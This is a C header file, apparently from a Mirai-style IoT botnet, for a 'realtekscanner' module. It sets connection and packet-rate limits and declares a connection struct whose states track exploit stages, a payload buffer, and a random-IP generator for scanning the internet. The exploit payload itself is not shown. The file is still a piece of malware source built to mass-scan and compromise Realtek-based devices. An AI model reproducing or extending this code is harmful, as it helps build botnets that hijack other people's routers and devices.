#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define realtekscanner_SCANNER_MAX_CONNS 512
#define realtekscanner_SCANNER_RAW_PPS 660
#else
#define realtekscanner_SCANNER_MAX_CONNS 256
#define realtekscanner_SCANNER_RAW_PPS 320
#endif

#ifdef SCAN_MAX
#define realtekscanner_SCANNER_RDBUF_SIZE 1024
#define realtekscanner_SCANNER_HACK_DRAIN 64
#else
#define realtekscanner_SCANNER_RDBUF_SIZE 256
#define realtekscanner_SCANNER_HACK_DRAIN 64
#endif

struct realtekscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        realtekscanner_SC_CLOSED,
        realtekscanner_SC_CONNECTING,
        realtekscanner_SC_EXPLOIT_STAGE2,
        realtekscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[realtekscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void realtekscanner_scanner_init();
void realtekscanner_scanner_kill(void);

static void realtekscanner_setup_connection(struct realtekscanner_scanner_connection *);
static ipv4_t realtekscanner_get_random_ip(void);
